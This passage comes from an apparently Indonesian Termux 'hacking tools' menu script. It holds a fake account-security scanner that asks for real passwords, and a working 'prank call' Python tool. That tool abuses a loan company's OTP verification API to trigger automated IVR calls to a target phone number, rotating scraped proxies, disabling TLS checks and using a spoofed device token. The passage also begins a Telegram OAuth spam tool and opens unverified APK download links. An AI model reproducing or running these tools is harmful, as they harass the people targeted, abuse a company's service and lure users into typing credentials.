    local domain=$(echo "$lower" | sed -E 's/.*@([^.]+).*/\1/')
    case "$domain" in
      gmail|googlemail) echo "Gmail" ;;
      yahoo) echo "Yahoo" ;;
      hotmail|outlook|live) echo "Microsoft" ;;
      protonmail|pm) echo "ProtonMail" ;;
      icloud|me|mac) echo "Apple" ;;
      *) echo "Email Lain" ;;
    esac
    return
  fi
  case "$lower" in
    *@instagram*|*instagr*|*ig.me*) echo "Instagram" ;;
    *@facebook*|*fb.com*) echo "Facebook" ;;
    *@twitter*|*@x.com*) echo "Twitter/X" ;;
    *@tiktok*) echo "TikTok" ;;
    *@youtube*|*@yt.*) echo "YouTube" ;;
    *@snapchat*) echo "Snapchat" ;;
    *@telegram*|*t.me*) echo "Telegram" ;;
    *@discord*) echo "Discord" ;;
    *@roblox*) echo "Roblox" ;;
    *@github*) echo "GitHub" ;;
    *@linkedin*) echo "LinkedIn" ;;
    *) echo "Username Umum" ;;
  esac
}
function check_email() {
  local email="$1"
  if echo "$email" | grep -E '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$' >/dev/null; then
    echo "1"
  else
    echo "0"
  fi
}
function check_password_strength() {
  local password="$1"
  local score=0
  local reasons=()
  local lower_pw=$(echo "$password" | tr '[:upper:]' '[:lower:]')
  for pw in "${COMMON_PASSWORDS[@]}"; do
    [[ "$lower_pw" == "$pw" ]] && { reasons+=("Password sangat umum & lemah"); echo "10"; echo "${reasons[@]}"; return; }
  done
  [[ ${#password} -ge 8 ]] && ((score+=20)) || reasons+=("Terlalu pendek (<8)")
  [[ ${#password} -ge 12 ]] && ((score+=20))
  [[ ${#password} -ge 16 ]] && ((score+=20))
  [[ "$password" =~ [a-z] ]] && ((score+=10)) || reasons+=("Tidak ada huruf kecil")
  [[ "$password" =~ [A-Z] ]] && ((score+=10)) || reasons+=("Tidak ada huruf besar")
  [[ "$password" =~ [0-9] ]] && ((score+=10)) || reasons+=("Tidak ada angka")
  [[ "$password" =~ [^a-zA-Z0-9] ]] && ((score+=10)) || reasons+=("Tidak ada simbol")
  local unique_chars=$(echo "$password" | fold -w1 | sort -u | wc -l)
  [[ $unique_chars -lt $((${#password}/2)) ]] && reasons+=("Karakter terlalu berulang")
  (( score = score > 100 ? 100 : score ))
  echo "$score"
  echo "${reasons[@]}"
}
function scanning_loader() {
  local duration="$1"
  local steps=50
  local delay=$(awk "BEGIN {print $duration / $steps}" 2>/dev/null || echo "0.1")
  for ((i = 0; i <= steps; i++)); do
    printf "\r${g}SCANNING KEAMANAN ${platform^^} ${y}[${r}%3d%%${y}]" "$((i * 2))"
    sleep "$delay"
  done
  echo -e "${g} SCANNING SELESAI..!!"
}
function main() {
  print_banner
  echo -e "${c}"
  read -p "Masukkan username [ atau : Gmail dan Dll ] ➤ : " account
  echo -e "${y}"
  read -p "Masukkan password akun ➤ : " password
  echo ""
  platform=$(detect_platform "$account")
  echo -e "${g}Platform terdeteksi : ${p}$platform"
  echo ""
  if [[ "$account" == *"@"* ]]; then
    email_valid=$(check_email "$account")
    if [[ "$email_valid" -eq 1 ]]; then
      email_score=100
      email_status="${g}Valid ${r}[ ${g}✓ ${r}]"
    else
      email_score=0
      email_status="${r}Tidak Valid"
    fi
  else
    email_score=100
    email_status="${b}Username (bukan email)"
  fi
  read strength reasons <<< "$(check_password_strength "$password")"
  total=$(((strength + email_score) / 2))
  scanning_time=$(awk "BEGIN {print 6 - ($total * 0.05)}" 2>/dev/null || echo "3")
  scanning_time=${scanning_time%.*}
  [[ $scanning_time -lt 1 ]] && scanning_time=1
  echo -e "${g}MOHON BERSABAR, SCANNING DIMULAI..!!"
  scanning_loader "$scanning_time"
  echo ""
  echo -e "${r}╔════════════════════════════════════╗"
  echo -e "${r}║${g}        HASIL KEAMANAN AKUN         ${r}║"
  echo -e "${r}╚════════════════════════════════════╝"
  echo ""
  echo -e "${p}Platform : ${n}$platform"
  [[ "$account" == *"@"* ]] && echo -e "${p}Email Status : $email_status"
  echo -e "${p}Password : ${r}[ ${c}$strength% ${r}]"
  if [[ ${#reasons[@]} -gt 0 ]]; then
  for reason in "${reasons[@]}"; do
    echo -e "${r} ✗ $reason" > /dev/null
  done
else
  echo -e "${g} ✓ Password sangat kuat!"
fi
  echo -e "${g}Total Kekuatan Akun : ${r}[ ${c}$total% ${r}]"
  case "$platform" in
    "Instagram"|"TikTok"|"Twitter/X")
      echo -e "${b}Tips : Gunakan 2FA & jangan pakai password sama di semua akun!" ;;
    "Gmail"|"Microsoft")
      echo -e "${b}Tips : Aktifkan 2-Step Verification di pengaturan keamanan!" ;;
    *)
      echo -e "${b}Tips : Selalu gunakan password unik & panjang minimal 12 karakter!" ;;
  esac
  echo -e "${c}Scan selesai Tetap aman di dunia digital!"
  echo ""
}
main
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
   read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
   clear
           ;;
   32)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
echo ""
echo -e "${red}[ ${g}✓ ${red}]${cyan} Mengecek dan menginstal modul Python jika diperlukan...!!"
sleep 3 
declare -A modules=(
  ["requests"]="requests"
  ["urllib3"]="urllib3"
  ["PIL"]="Pillow"
  ["certifi"]="certifi"
  ["rich"]="rich"
)
echo ""
for mod in "${!modules[@]}"; do
  echo -e "${red}[ 🚨 ]${yellow} Mengecek modul '$mod'...!!"
  python -c "import $mod" 2>/dev/null
  if [ $? -ne 0 ]; then
    echo ""
    echo -e "${red}Belum terinstall. Menginstal '${modules[$mod]}'...!!"
    pip install "${modules[$mod]}"
  else
    echo ""
    echo -e "${green}Sudah terinstall."
    sleep 2 
    echo ""
  fi
done
cat > Call.py << 'EOF'
def spam_call():
    import requests
    import os
    import random
    import time
    import urllib3
    from PIL import Image
    from io import BytesIO
    import certifi
    from rich.panel import Panel
    from rich.columns import Columns
    from rich.console import Console
    from rich import print as printf
    os.system("clear")
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
    a = "\033[1;30m"
    m = "\033[1;31m"
    h = "\033[1;32m"
    k = "\033[1;33m"
    c = "\033[1;36m"
    p = "\033[1;37m"
    r = "\033[0m"
    print(f"""
  {m}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀{m}⣤⣤⡶⠶⠾⠟⠛⠛⠛⠛⠛⠛⠛⡛⠛⠛⠻⠷⠶⢶⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  {m}⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠶⠛⢋{a}⣉⣥⡴⠂⠀⠀⠀⠀⠀⣾⣄⣀⣀⣰⡇⠀⠀⠀⠀⠀⠰⣤⣤⣉{m}⡙⠛⠶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
  {m}⠀⠀⠀⠀⢀⣤⡾⠛{a}⣉⣤⣶⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣶⣤⣉{m}⠛⢷⣤⡀⠀⠀⠀⠀
  {m}⠀⠀⢀⣴⠟{a}⣁⣴⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣷⣦{m}⡈⠻⣦⡀⠀⠀
  {m}⠀⣰⡟⢁{a}⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣄⣀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⣀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦{m}⡈⢿⣆⠀
  {m}⢠⡿⢁{a}⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡈{m}⢿⡄
  {m}⣾⡇{a}⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇{m}⢸⣧
  {m}⢿⡇{a}⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇{m}⢸⣏
  {m}⠘⣿⡀{a}⢿⣿⣿⣿⣿⣿⣿⣿⠋⠉⠉⠉⠻⢿⣿⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⡿⠛⠉⠉⠉⠹⣿⣿⣿⣿⣿⣿⣿⠟{m}⢠⣿⠁
  {m}⠀⠈⢿⣆{a}⠙⢿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⠈⢿⣿⣿⣿⣿⡟⠁⠀⠀⠹⠁⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡿⠋{m}⣠⡿⠁⠀
  {m}⠀⠀⠀⠙⢷⣦{a}⡙⠻⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⠟⢉{m}⣤⡾⠋⠀⠀⠀
  {m}⠀⠀⠀⠀⠈⠙⠷⣦⣍{a}⡛⠻⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠟⢋{m}⣡⣴⠾⠋⠁⠀⠀⠀⠀
  {m}⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠷⢶⣤⣅⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣨{m}⣤⡶⠾⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
  {m}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠷⠶⠶⠶⣶⣤⣤⣤⣤⣤⣴⣶⠶⠶⠶⠟⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀

                {a}[ {m}> {p}PRANK TELEPHONE! {m}< {a}]
""")  
    sd_card_path = "/storage/emulated/0/"
    folder_name = "Image-Captha"
    folder_path = os.path.join(sd_card_path, folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    PROXY_ENABLED = True
    VPN_ENABLED = True
    PROXY_FILE = "saved_proxy.txt"
    saved_proxy = None
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r") as file:
            saved_proxy = file.read().strip()
    proxy_list = []
    if not saved_proxy:
        try:
            response = requests.get("https://www.sslproxies.org", verify=False, timeout=5).text.split('\n')
            proxy_list = list(set([f"http://{ip_port}" for ip_port in response if ":" in ip_port]))
        except Exception as e:
            print(f"[❌] Gagal mengambil daftar proxy: {e}")
    session = requests.Session()
    success = False
    captcha_generate_url = "https://loan.easycash.id/api/user/generateCaptcha"
    captcha_image_url = "https://loan.easycash.id/api/user/getCaptchaImage/"
    verify_url = "https://loan.easycash.id/api/mobile/sendVerificationWithoutCaptcha"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
        "Origin": "https://loan.easycash.id",
        "Referer": "https://loan.easycash.id/register-login?channelName=googleNPM"
    }
    headers_bay = {
        "Host": "loan.easycash.id",
        "Connection": "keep-alive",
        "Content-Length": "160",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        "sec-ch-ua-mobile": "?1",
        "blackbox": "tddfeyJ2IjoiNC4wLjQiLCJvcyI6MywicCI6IkZpbnRvcGlhX2lkIiwiZSI6NH0...",
        "YQG-PLATFORM-DEVICE-TOKEN": "webFakeToken-a961b47541f74409abd783bb15ade95b",
        "build": "35313",
        "YQG-PLATFORM-LANGUAGE": "id",
        "YQG-PLATFORM-SDK-TYPE": "IDN_YQD",
        "Accept": "application/json, text/plain, */*",
        "CHANNEL": "linkaja",
        "PlatformType": "WEB",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
        "Origin": "https://loan.easycash.id",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://loan.easycash.id/register-login?channelName=linkaja",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id-ID,id;q=0.9,vi-VN;q=0.8,vi;q=0.7,zh-CN;q=0.6,zh-TW;q=0.5,zh;q=0.4,en-US;q=0.3,en;q=0.2",
        "Cookie": "sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22194ee07ceecde-0858487b0c6e68-b457451-475752-194ee07ceee7a%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A...",
    }
    try:
        response = requests.post(captcha_generate_url, headers=headers, verify=certifi.where())
        response.raise_for_status()
        captcha_data = response.json()
        captcha_id = captcha_data.get("body")
    except Exception as e:
        print(f"[❌] Gagal mendapatkan CAPTCHA ID! Error: {e}")
        exit()
    try:
        captcha_image_response = requests.get(f"{captcha_image_url}{captcha_id}", headers=headers, verify=certifi.where())
        captcha_image_response.raise_for_status()
        img = Image.open(BytesIO(captcha_image_response.content)).convert("L")
        img.save("/storage/emulated/0/Image-Captha/captcha.png")
        img.show()
        printf(Panel(f"[bold white]Captha Berhasil Di Download Tersimpan di [bold red]/sdcard/Image-Captha/captcha.png [bold white],Pastikan Masukan Captha Yang Benar Agar berhasil",width=57,style="bold bright_black", title="[bold red]>>[bold white]Masukan Captha[bold red]<<",subtitle_align="left"))
    except Exception as e:
        print(f"[❌] Gagal mengambil CAPTCHA! Error: {e}")
        exit()
    captcha_text = input(f"\n{a}[{m}?{a}] {p}Masukkan Kode CAPTHA {m}:{a} ")
    phone_number = input(f"{a}[{m}?{a}] {p}Masukkan Nomor Target {a}8××× {m}:{a} ")
    print()
    printf(Panel(f"[bold white]Sedang Prank Call Menggunakan Proxy Random",width=57,style="bold bright_black", title="[bold red]>>[bold white]Proses[bold red]<<",subtitle_align="left"))
    data = {
        "mobileNumber": f"0{phone_number}",
        "notifType": "IVR",
        "verificationPurpose": "REGISTER_OR_LOGIN",
        "captcha": captcha_text,
        "captchaKey": captcha_id
    }
    while not success:
        if saved_proxy:
            proxy_list = [saved_proxy]
        else:
            random.shuffle(proxy_list)
        for proxy in proxy_list:
            proxies = {"http": proxy, "https": proxy} if proxy else None
            try:
                response = session.post(verify_url, json=data, headers=headers_bay, proxies=proxies, timeout=5, verify=False)
                response.raise_for_status()
                response_json = response.json()
                printf(Panel(f"[bold white]{response_json}",width=57,style="bold bright_black", title="[bold red]>>[bold white]Respon[bold red]<<", subtitle_align="left"))
                saved_proxy = proxy
                with open(PROXY_FILE, "w") as file:
                    file.write(saved_proxy)
                success = True
                break
            except requests.exceptions.RequestException:
                if os.path.exists(PROXY_FILE):
                    os.remove(PROXY_FILE)
                saved_proxy = None
        time.sleep(2)
    input(f"\n{a}[{m}!{a}]{p} Tekan entar untuk kembali ke menu. {a}| \033[101m\033[1;32m ENTER \033[0m")
if __name__ == "__main__":
    spam_call()
EOF
chmod +x Call.py
python Call.py
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
rm -rf "$HOME/Call.py"
clear
    ;;
        33)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
p='\033[35;1m'
n='\033[0m'
if ! command -v whois &> /dev/null; then
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Installing whois...!!"
    echo -e "${n}"
    pkg install whois
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} whois sudah terinstall."
    sleep 2 
    clear 
fi
clear
echo ""
echo "
██╗    ██╗██╗  ██╗ ██████╗ ██╗███████╗    
██║    ██║██║  ██║██╔═══██╗██║██╔════╝    
██║ █╗ ██║███████║██║   ██║██║███████╗    
██║███╗██║██╔══██║██║   ██║██║╚════██║    
╚███╔███╔╝██║  ██║╚██████╔╝██║███████║    
 ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚══════╝     
 " | lolcat  
echo -e "${r}Author ${g}:${c} By.Thonxuzz404"
echo -e "${r}Github ${g}:${c} https://github.com/Thonxyzz404HanX"
echo -e "${y}Info : Whois adalah protokol internet untuk mencari 
informasi tentang domain."
echo -e "${p}"
read -p "Masukkan IP atau Nama Domain : " target
echo ""
echo -e "${r}[ ${g}✓ ${r}]${y} Mencari informasi tentang : " $target 
echo -e "${n}"
whois "$target"
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
  ;;
       34)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
               cd
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
clear 
echo "
 ▗▄▖ ▗▄▄▖ ▗▖ ▗▖▗▄▄▄▖▗▄▄▄▖▗▄▄▖ ▗▖  ▗▖▗▖ ▗▖▗▖  ▗▖    
▐▌ ▐▌▐▌ ▐▌▐▌▗▞▘  █  ▐▌   ▐▌ ▐▌▐▛▚▞▜▌▐▌ ▐▌ ▝▚▞▘     
▐▛▀▜▌▐▛▀▘ ▐▛▚▖   █  ▐▛▀▀▘▐▛▀▚▖▐▌  ▐▌▐▌ ▐▌  ▐▌      
▐▌ ▐▌▐▌   ▐▌ ▐▌  █  ▐▙▄▄▖▐▌ ▐▌▐▌  ▐▌▝▚▄▞▘▗▞▘▝▚▖    
" | lolcat 
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${g} AUTHOR ${r}= ${c}By.Thonxyzz404              ${b}║"
echo -e "║${g} TELEGRAM ${r}= ${c}t.me/Thonxyzz404          ${b}║"
echo -e "║${g} AKUN TIKTOK ${r}= ${c}@thonxyzz404           ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r} [ ${y}01 ${r}]${g} Termux-V2 no welpaper         ${b}║"
echo -e "║${r} [ ${y}02 ${r}]${g} Termux-V3 no welpaper         ${b}║"
echo -e "║${r} [ ${y}03 ${r}]${g} Zero-termux-V2 pake welpaper  ${b}║"
echo -e "║${r} [ ${y}04 ${r}]${g} Zero-termux-V3 pake welpaper  ${b}║"
echo -e "║${r} [ ${y}05 ${r}]${p} Keluar dari tools.            ${b}║"
echo -e "╚══════════════════════════════════════╝"
echo ""
read -p "$(echo -e "${y}Masukkan menu pilihan anda ${r}[ ${g}1\2\3\4\5 ${r}]${c} : ")" kon
case $kon in
1|01)
clear
echo "
▗▄▄▄▖▗▄▄▄▖▗▄▄▖ ▗▖  ▗▖▗▖ ▗▖▗▖  ▗▖ ▗▄▖ ▗▄▄▖ ▗▄▄▄▖
  █  ▐▌   ▐▌ ▐▌▐▛▚▞▜▌▐▌ ▐▌ ▝▚▞▘ ▐▌ ▐▌▐▌ ▐▌  █  
  █  ▐▛▀▀▘▐▛▀▚▖▐▌  ▐▌▐▌ ▐▌  ▐▌  ▐▌ ▐▌▐▛▀▚▖  █  
  █  ▐▙▄▄▖▐▌ ▐▌▐▌  ▐▌▝▚▄▞▘▗▞▘▝▚▖▝▚▄▞▘▐▌ ▐▌▗▄█▄▖
" | lolcat
echo -e "${g}===============${r} TERMUX-ORIZINAL ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading....!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading....!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://www.mediafire.com/file/ghhgaxlp4x5ym29/Betta2.apk/file"
echo ""
echo -e "${g} SELESAI MEMBUKA TERMUX-ORI-V2 URL LINK..!!"
echo ""
 ;;
2|02)
clear 
echo "
▗▄▄▄▖▗▄▄▄▖▗▄▄▖ ▗▖  ▗▖▗▖ ▗▖▗▖  ▗▖ ▗▄▖ ▗▄▄▖ ▗▄▄▄▖
  █  ▐▌   ▐▌ ▐▌▐▛▚▞▜▌▐▌ ▐▌ ▝▚▞▘ ▐▌ ▐▌▐▌ ▐▌  █  
  █  ▐▛▀▀▘▐▛▀▚▖▐▌  ▐▌▐▌ ▐▌  ▐▌  ▐▌ ▐▌▐▛▀▚▖  █  
  █  ▐▙▄▄▖▐▌ ▐▌▐▌  ▐▌▝▚▄▞▘▗▞▘▝▚▖▝▚▄▞▘▐▌ ▐▌▗▄█▄▖
" | lolcat 
echo -e "${g}===============${r} TERMUX-ORIZINAL ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading....!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading....!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://www.mediafire.com/file/qrvluci6pe00n53/Betta3.apk/file"
echo ""
echo -e "${g} SELESAI MEMBUKA TERMUX-ORI-V3 URL LINK..!!"
echo ""
  ;;
3|03)
clear 
echo "
▗▄▄▄▄▖▗▄▄▄▖▗▄▄▖  ▗▄▖▗▄▄▄▖▗▄▄▄▖▗▄▄▖ ▗▖  ▗▖▗▖ ▗▖▗▖  ▗▖    
   ▗▞▘▐▌   ▐▌ ▐▌▐▌ ▐▌ █  ▐▌   ▐▌ ▐▌▐▛▚▞▜▌▐▌ ▐▌ ▝▚▞▘     
 ▗▞▘  ▐▛▀▀▘▐▛▀▚▖▐▌ ▐▌ █  ▐▛▀▀▘▐▛▀▚▖▐▌  ▐▌▐▌ ▐▌  ▐▌      
▐▙▄▄▄▖▐▙▄▄▖▐▌ ▐▌▝▚▄▞▘ █  ▐▙▄▄▖▐▌ ▐▌▐▌  ▐▌▝▚▄▞▘▗▞▘▝▚▖    
" | lolcat 
echo -e "${g}===============${r} ZERO-TERMUX-V2 ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading....!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading....!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://www.mediafire.com/file/tz1bvqncwe9ylu8/Zero_2023.apk/file"
echo ""
echo -e "${g} SELESAI MEMBUKA ZERO-TERMUX URL LINK..!!"
echo ""
  ;;
4|04)
clear
echo "
▗▄▄▄▄▖▗▄▄▄▖▗▄▄▖  ▗▄▖▗▄▄▄▖▗▄▄▄▖▗▄▄▖ ▗▖  ▗▖▗▖ ▗▖▗▖  ▗▖    
   ▗▞▘▐▌   ▐▌ ▐▌▐▌ ▐▌ █  ▐▌   ▐▌ ▐▌▐▛▚▞▜▌▐▌ ▐▌ ▝▚▞▘     
 ▗▞▘  ▐▛▀▀▘▐▛▀▚▖▐▌ ▐▌ █  ▐▛▀▀▘▐▛▀▚▖▐▌  ▐▌▐▌ ▐▌  ▐▌      
▐▙▄▄▄▖▐▙▄▄▖▐▌ ▐▌▝▚▄▞▘ █  ▐▙▄▄▖▐▌ ▐▌▐▌  ▐▌▝▚▄▞▘▗▞▘▝▚▖    
" | lolcat
echo -e "${g}===============${r} ZERO-TERMUX-V3 ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading....!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading....!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://www.mediafire.com/file/bdly6c7mevim6tf/Zero_2025.apk/file"
echo ""
echo -e "${g} SELESAI MEMBUKA ZERO-TERMUX URL LINK..!!"
echo ""
  ;;
5|05)
clear 
echo ""
echo -e "${y} Keluar dari tools..!!"
echo ""
;;
*)
clear 
echo ""
echo -e "${c} Pilihan Anda Tidak Valid..!!"
echo ""
;;
esac
       echo ""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
                 ;;
      35)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
figlet Tombol-V8 | lolcat
echo -e "${r}"
read -p "Silahkan tekan entar untuk menjalankanya."
clear 
properties() {
    mkdir -p ~/.termux
    {
        echo "# Author : By.Thonxyzz404"
        echo "font-size=8"
        echo "bell-character=ignore"
        echo "terminal-transcript-opacity=0.95"
        echo "use-black-ui=true"
        echo "hide-soft-keyboard-on-startup=true"
        echo "clipboard-autocopy=true"
        echo "terminal-margin-vertical=1"
        echo "extra-keys=[ \\"
        echo " ['TAB','>','<','/','exit\n','PGUP'], \\"
        echo " ['SHIFT','ls\n','cd Goblok\n','bash Install.sh\n','()','cd\n'], \\"
        echo " ['cd /sdcard/','-','rm -rf ','&','UP','{}'], \\"
        echo " ['CTRL','%','clear\n','LEFT','DOWN','RIGHT'] \\"
        echo "]"
    } > ~/.termux/termux.properties
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${c} Tombol termux Toolsv8 telah terpasang."
    termux-reload-settings
}
properties
echo ""
echo -e "${red}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
      36)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Spam Telegram...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
                cd
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
url="https://oauth.telegram.org/auth/request?bot_id=1264128836&origin=https%3A%2F%2Fwww.money-whale.com&request_access=read"
banner_skill() {
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣴⣿⣿⣿⣿⣯⣤⣶⣶⣾⣿⣶⣶⣿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠉⠁⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⠶⠶⠦⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣟⣡⣤⣾⣿⣿⣿⣿⣿⣿⢏⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻⢿⣿⣿⣦⡀⠀⠀⠀⠀⠀
